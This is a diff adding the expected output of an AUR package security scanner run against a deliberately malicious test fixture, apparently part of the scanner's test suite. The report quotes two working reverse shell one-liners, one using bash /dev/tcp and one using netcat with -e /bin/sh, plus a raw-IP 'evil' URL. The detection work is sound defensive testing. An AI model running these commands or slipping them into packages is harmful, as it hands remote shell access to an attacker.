@@ -1,0 +1,39 @@
+
+Scan Results: malicious-reverse-shell
+============================================================
+
+[CRITICAL] SHELL-001 Bash reverse shell
+    Pattern indicates a bash reverse shell connection
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD:14
+    Code:     bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+    Recommendation: Remove reverse shell code immediately
+    Reference: CWE-506
+
+[CRITICAL] SHELL-002 Netcat reverse shell
+    Netcat with execute flag indicates reverse shell
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD:19
+    Code:     nc -e /bin/sh 192.168.1.100 4444
+    Recommendation: Remove reverse shell code immediately
+    Reference: CWE-506
+
+[HIGH] URL-001 Raw IP in URL
+    URLs with raw IP addresses are suspicious
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD:9
+    Code: url="http://192.168.1.100/evil"
+    Recommendation: Use domain names from trusted sources
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: malicious-reverse-shell v1.0.0-1
+Scan duration: 2ms
+
+Found 4 issue(s):
+  2 CRITICAL
+  1 HIGH
+  1 MEDIUM
+============================================================
